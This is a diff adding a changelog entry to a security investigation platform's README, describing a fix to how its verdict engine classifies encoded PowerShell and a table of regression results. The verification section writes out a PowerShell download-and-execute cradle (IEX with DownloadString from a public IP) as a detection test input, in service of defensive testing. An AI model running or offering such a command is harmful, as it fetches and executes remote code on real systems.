@@ -1,5 +1,51 @@
 # NivXRay — Enterprise Attack Investigation Platform
 
+## 2026-08-01 · **✅ Encoded-PS Classification Fix + Public-IP Regression · SHIPPED**
+
+Operator approved exactly two items after reviewing the P0 stabilization; freeze on Phase 4 / Golden Corpus remains active until operator manually reviews benign / suspicious / malicious / PowerShell / Office / Sysmon / QRadar samples.
+
+### Fix 1 · Encoded-PowerShell classification bug closed
+- **Root cause**: `verdict_engine._kind_for_graph_node()` short-circuited on `IEX` in the decoded preview before the structural `ps-encodedcommand-recovery` op check ran. Every recovered layer was tagged `invoke_expression`; NONE was tagged `encoded_powershell`. The strongest escalation rule (`encoded PS + IEX + network download`) required BOTH kinds → never fired.
+- **Fix**: reordered — if the decoder op matches `ps-encodedcommand` / `encoded_command` / `encodedcommand` we return `encoded_powershell` (structural fact) up-front. The IEX/Invoke-Expression semantic match still fires on downstream layers (`extract-payload`, `family-emotet`) whose previews carry `IEX(...)`.
+- **Verification**: live investigation `powershell -EncodedCommand ...IEX(...DownloadString('http://185.220.101.5/mal.exe'))`:
+  - Both `encoded_powershell` AND `invoke_expression` now present in `verdict.explain.fired`.
+  - Escalation rules applied: `encoded PS + IEX + network download` (Malicious promotion) and `encoded PS + IEX` (Suspicious tier).
+
+### Fix 2 · Public-IP regression validation
+| Case | Verdict | `internal_ip` mitigator | Escalation rule |
+|---|---|---|---|
+| Encoded PS + IEX + `192.168.1.1` (private) | Malicious @ **57%** | ✅ Fires (dampens 50%) | encoded PS + IEX + network download |
+| Encoded PS + IEX + `185.220.101.5` (public) | Malicious @ **100%** | ❌ Does NOT fire | encoded PS + IEX + network download |
+| PS `Invoke-WebRequest` + public IP (no encoding) | Malicious @ **99%** | — | none needed |
+| Plain PowerShell `Get-Process` | Runtime Dependent @ **48%** | — | none |
+| `SGVsbG8gV29ybGQ=` (base64 "Hello World") | Informational @ **8%** | — | none |
+
+Verdict engine now calibrates monotonically across the benign → malicious range with no false-positives on benign inputs and full escalation on public-C2 payloads.
+
+### Report Validator still PASS on every case above (`8/8 checks · 0 blockers`)
+
+### Regression
+- 281/283 pytest passing (the 2 remaining failures are pre-existing `test_platform_health_reports_all_sections` ordering flake and `test_no_nivxforge_module_imports_from_workspace` — both fail on baseline, untouched by this session).
+
+### Files touched
+- `/app/backend/nivxforge/investigation/verdict_engine.py` — `_kind_for_graph_node()` decoded_fragment branch reordered.
+
+### Still frozen (operator-locked)
+- ❌ Phase 4 Incident Correlation Engine
+- ❌ Golden Corpus expansion (must first review 10–15 real investigations manually, then seed from verified behaviour)
+
+### Production Readiness Checklist (operator-mandated · gate for Phase 4)
+1. Executive report renders correctly ✅
+2. Verdict rationale evidence-based ✅
+3. Markdown never leaks ✅ (`no_raw_markdown_leaks` in validator)
+4. Customer persona never exposes decoder internals ✅ (`persona_hygiene_pass` in validator)
+5. IOCs / MITRE / LOLBAS / recovered payload / recommendations all render when present ✅ (5 validator checks)
+6. Verdict calibration behaves correctly for benign / suspicious / malicious ✅ (verified above)
+7. Executive Validator passes on every golden sample ⏸ (pending Golden Corpus)
+
+---
+
+
 ## 2026-08-01 · **🚨 P0 Executive Experience Stabilization · SHIPPED · directive-locked**
 
 Operator directive: STOP all feature development (Phase 4, Golden Corpus, Explainability, Learning, Persona, Correlation, LLM polish, new UI). The Executive report is the blocking product-quality issue.
